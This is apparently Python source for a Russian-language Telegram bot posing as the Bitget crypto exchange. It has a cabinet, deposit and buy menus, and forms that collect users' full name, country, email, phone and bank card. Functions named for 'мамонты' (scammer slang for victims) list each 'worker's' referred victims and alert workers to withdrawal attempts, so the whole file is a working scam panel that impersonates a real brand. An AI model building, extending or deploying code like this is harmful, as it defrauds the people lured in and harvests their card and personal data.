import generates
import sqlite3
from telebot import types
from generates import *




def send_cabinet(bot, call, called=True):

    keyboard = types.InlineKeyboardMarkup()

    button1 = types.InlineKeyboardButton(text="🖥Личный кабинет", callback_data='cabinet')
    button2 = types.InlineKeyboardButton(text="📈Купить криптовалюту", callback_data='buy crypto')
    keyboard.add(button1)
    keyboard.add(button2)

    buttons = [
        types.InlineKeyboardButton(text="💳Пополнить", callback_data='deposit'),
        types.InlineKeyboardButton(text="🏦Вывести активы", callback_data='withdraw'),
        types.InlineKeyboardButton(text="🛠Настройки", callback_data='settings'),
        types.InlineKeyboardButton(text="ℹ️Информация о нас", callback_data='info'),
        types.InlineKeyboardButton(text="⚙️Тех.поддержка", callback_data='support', url="https://t.me/Bit_GetSupport")
    ]

    keyboard.row(*buttons[0:2])
    keyboard.row(*buttons[2:4])
    keyboard.add(buttons[4])

    photo = open("cabinet.jpg", "rb")

    if called:
        bot.send_photo(call.message.chat.id, photo, caption=generate_cabinet_text(str(call.from_user.id)), reply_markup=keyboard)
    else:
        bot.send_photo(call.chat.id, photo, caption=generate_cabinet_text(str(call.from_user.id)), reply_markup=keyboard)
    
    photo.close()


def send_info(bot, call, called=True):

    keyboard = types.InlineKeyboardMarkup()

    button1 = types.InlineKeyboardButton(text="🔆Подтверждение резервов", callback_data='proof of reserves', url="https://www.bitget.com/ru/proof-of-reserves")
    button2 = types.InlineKeyboardButton(text="🔆Гарантия сервиса", callback_data='guarantee')
    keyboard.add(button1, button2)

    button3 = types.InlineKeyboardButton(text="🔆Cостояние сети", callback_data='network status')
    button4 = types.InlineKeyboardButton(text="🔆Дополнительно", callback_data='more info', url="https://ru.beincrypto.com/exchanges/bitget/")
    keyboard.add(button3, button4)
    button5 = types.InlineKeyboardButton(text="Вернуться в личный кабинет", callback_data='cabinet')
    keyboard.add(button5)

    photo = open("info.jpg", "rb")

    if called:
        bot.send_photo(call.message.chat.id, photo, caption="Выберите интересующую вас информацию:", reply_markup=keyboard)
    else:
        bot.send_photo(call.chat.id, photo, caption="Выберите интересующую вас информацию:", reply_markup=keyboard)
    photo.close()


def send_guarantee(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="Назад", callback_data='info')
    keyboard.add(button)

    photo = open("info.jpg", "rb")
    bot.send_photo(call.message.chat.id, photo, caption=generate_guarantee(), reply_markup=keyboard)
    photo.close()


def send_status(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="Назад", callback_data='info')
    keyboard.add(button)

    photo = open("info.jpg", "rb")
    bot.send_photo(call.message.chat.id, photo, caption=generate_status(), reply_markup=keyboard)
    photo.close()


def send_settings(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()


    button1 = types.InlineKeyboardButton(text="👤Установить Ф.И.О", callback_data='set FIO')
    keyboard.add(button1)

    button2 = types.InlineKeyboardButton(text="🌍Установить страну", callback_data='set country')
    button3 = types.InlineKeyboardButton(text="📪Установить email", callback_data='set email')
    keyboard.add(button2, button3)

    button4 = types.InlineKeyboardButton(text="📱Установить номер", callback_data='set number')
    button5 = types.InlineKeyboardButton(text="💳Установить карту", callback_data='set card')
    keyboard.add(button4, button5)

    button6 = types.InlineKeyboardButton(text="🛠Тех.поддержка", callback_data='get support')
    keyboard.add(button6)

    button7 = types.InlineKeyboardButton(text="🔙Выйти из меню настроек", callback_data='cabinet')
    keyboard.add(button7)

    photo = open("settings.jpg", "rb")
    bot.send_photo(call.message.chat.id, photo, caption=generate_settings(str(call.from_user.id)), reply_markup=keyboard)
    photo.close()


def send_get_support(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()

    button1 = types.InlineKeyboardButton(text="Написать", url="https://t.me/Bit_GetSupport")
    button2 = types.InlineKeyboardButton(text="⚙️Вернуться к настройкам", callback_data='settings')
    keyboard.add(button1, button2)

    photo = open("settings.jpg", "rb")
    bot.send_photo(call.message.chat.id, photo, caption=generate_get_support(), reply_markup=keyboard)
    photo.close()


def send_set_FIO(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="✖️Отмена", callback_data='settings')
    keyboard.add(button)

    bot.send_message(call.message.chat.id, "Пожалуйста, введите ваше полное Ф.И.О (Фамилия Имя Отчество):", reply_markup=keyboard)

def send_after_set_FIO(bot, call, FIO):
    keyboard = types.InlineKeyboardMarkup()

    button2 = types.InlineKeyboardButton(text="🖥Вернуться в личный кабинет", callback_data='cabinet')
    keyboard.add(button2)

    button1 = types.InlineKeyboardButton(text="⚙️Вернуться к настройкам", callback_data='settings')
    keyboard.add(button1)

    bot.send_message(call.chat.id, f"ваше Ф.И.О: {FIO}", reply_markup=keyboard)

def send_set_country(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="✖️Отмена", callback_data='settings')
    keyboard.add(button)

    bot.send_message(call.message.chat.id, "Пожалуйста, введите вашу страну:", reply_markup=keyboard)



def send_after_set_country(bot, call, country):
    keyboard = types.InlineKeyboardMarkup()

    button2 = types.InlineKeyboardButton(text="🖥Вернуться в личный кабинет", callback_data='cabinet')
    keyboard.add(button2)

    button1 = types.InlineKeyboardButton(text="⚙️Вернуться к настройкам", callback_data='settings')
    keyboard.add(button1)

    bot.send_message(call.chat.id, f"ваша страна: {country}", reply_markup=keyboard)


def send_set_email(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="✖️Отмена", callback_data='settings')
    keyboard.add(button)

    bot.send_message(call.message.chat.id, "Пожалуйста, введите ваш email:", reply_markup=keyboard)



def send_after_set_email(bot, call, email):
    keyboard = types.InlineKeyboardMarkup()

    button2 = types.InlineKeyboardButton(text="🖥Вернуться в личный кабинет", callback_data='cabinet')
    keyboard.add(button2)

    button1 = types.InlineKeyboardButton(text="⚙️Вернуться к настройкам", callback_data='settings')
    keyboard.add(button1)

    bot.send_message(call.chat.id, f"ваш email: {email}", reply_markup=keyboard)


def send_set_card(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="✖️Отмена", callback_data='settings')
    keyboard.add(button)

    bot.send_message(call.message.chat.id, "Пожалуйста, введите вашу карту:", reply_markup=keyboard)



def send_after_set_card(bot, call, email):
    keyboard = types.InlineKeyboardMarkup()

    button2 = types.InlineKeyboardButton(text="🖥Вернуться в личный кабинет", callback_data='cabinet')
    keyboard.add(button2)

    button1 = types.InlineKeyboardButton(text="⚙️Вернуться к настройкам", callback_data='settings')
    keyboard.add(button1)

    bot.send_message(call.chat.id, f"ваша карта: {email}", reply_markup=keyboard)



def send_set_number(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="✖️Отмена", callback_data='settings')
    keyboard.add(button)

    bot.send_message(call.message.chat.id, "Пожалуйста, введите ваш номер:", reply_markup=keyboard)



def send_after_set_number(bot, call, email):
    keyboard = types.InlineKeyboardMarkup()

    button2 = types.InlineKeyboardButton(text="🖥Вернуться в личный кабинет", callback_data='cabinet')
    keyboard.add(button2)

    button1 = types.InlineKeyboardButton(text="⚙️Вернуться к настройкам", callback_data='settings')
    keyboard.add(button1)

    bot.send_message(call.chat.id, f"ваш номер: {email}", reply_markup=keyboard)


def send_deposit(bot, call):
    keyboard = types.InlineKeyboardMarkup()

    button1 = types.InlineKeyboardButton(text="💳Пополнить через банковскую карту", callback_data='deposit card')
    keyboard.add(button1)

    button2 = types.InlineKeyboardButton(text="💱Пополнить через BTC", callback_data='deposit btc')
    keyboard.add(button2)

    button3 = types.InlineKeyboardButton(text="🖥Вернуться в личный кабинет", callback_data='cabinet')
    keyboard.add(button3)

    photo = open("deposit.jpg", "rb")
    bot.send_photo(call.message.chat.id, photo, caption="Выберите платежную систему для пополнения баланса", reply_markup=keyboard)
    photo.close()

def send_deposit_card(bot, call):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="Вернуться к выбору платежной системы", callback_data='deposit')
    keyboard.add(button)

    photo = open("deposit.jpg", "rb")
    bot.send_photo(call.message.chat.id, photo, caption=generate_deposit_card(call.from_user.id), reply_markup=keyboard)
    photo.close()

def send_deposit_bitcoin(bot, call):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="Вернуться к выбору платежной системы", callback_data='deposit')
    keyboard.add(button)

    photo = open("deposit.jpg", "rb")
    bot.send_photo(call.message.chat.id, photo, caption=generate_deposit_bitcoin(), reply_markup=keyboard)
    photo.close()

def send_buy(bot, call):
    keyboard = types.InlineKeyboardMarkup()

    l = ['BTC', 'ETH', 'XRP', 'EOS', 'BCH', 'LTC', 'ADA', 'ETC', 'LINK', 'TRX', 'DOT', 'DOGE', 'SOL', 'MATIC', 'BNB', 'UNI', 'ICP', 'AAVE', 'FIL', 'XLM']
    for i in range(0,len(l),2):
        button1 = types.InlineKeyboardButton(text=l[i], callback_data=l[i])
        button2 = types.InlineKeyboardButton(text=l[i+1], callback_data=l[i+1])
        keyboard.add(button1, button2)
    
    button = types.InlineKeyboardButton(text="🔙Вернуться в личный кабинет", callback_data='cabinet')
    keyboard.add(button)

    bot.send_message(call.message.chat.id, "🌕 Выберите криптовалюту для дальнейшей торговли:", reply_markup=keyboard)
    

def send_buy_exact(bot, call):
    keyboard = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="✖️Отмена", callback_data='buy crypto')
    keyboard.add(button)

    bot.send_message(call.message.chat.id, generate_buy(call.data, call.from_user.id), reply_markup=keyboard)

def send_buy_error(bot, call):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="🔙Вернуться к списку", callback_data='buy crypto')
    keyboard.add(button)

    bot.send_message(call.chat.id, "❌Ошибка при вводе данных", reply_markup=keyboard)

def send_buy_success(bot, call):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="🔙Вернуться к списку", callback_data='buy crypto')
    keyboard.add(button)

    bot.send_message(call.chat.id, "✅Покупка прошла успешно", reply_markup=keyboard)




def send_text(bot, call, buttons, text, called=True):
    keyboard = types.InlineKeyboardMarkup()

    for i in buttons:
        temp = []
        for j in i:
            temp.append(types.InlineKeyboardButton(text=j[0], callback_data=j[1]))
        
        keyboard.add(*temp)
    
    if called:
        bot.send_message(call.message.chat.id, text, reply_markup=keyboard)
    else:
        bot.send_message(call.chat.id, text, reply_markup=keyboard)




def send_mamonts(bot, call, user_id):
    keyboard = types.InlineKeyboardMarkup()

    refs_list = load_refs()

    any_refs = user_id in refs_list

    if any_refs:
        refs  = refs_list[user_id]
        for ref in refs:
            chat_info = bot.get_chat(ref)
            if chat_info.last_name is None:
                username = chat_info.first_name
            else:
                username = chat_info.first_name + chat_info.last_name

            keyboard.add(types.InlineKeyboardButton(f"🦣{username} -- {ref}", callback_data= "manage mamont " + str(ref)))
        
        keyboard.add(types.InlineKeyboardButton(f"Обратно в меню", callback_data="working"))
        bot.send_message(call.message.chat.id, "Список мамонтов", reply_markup=keyboard)
    else:

        keyboard.add(types.InlineKeyboardButton(f"Обратно в меню", callback_data="working"))
        bot.send_message(call.message.chat.id, "У вас нет мамонтов", reply_markup=keyboard)




def send_withdrawal_request(bot, ref, amount, success):
    
    refs = load_refs()
    keyboard = types.InlineKeyboardMarkup()

    keyboard.add(types.InlineKeyboardButton("Перейти к меню мамонта", callback_data= "manage mamont " + str(ref)))

    for worker in refs.keys():
        if ref in refs[worker]:
            bot.send_message(int(worker), generate_withdraw_worker(bot, ref, amount, success), reply_markup=keyboard)



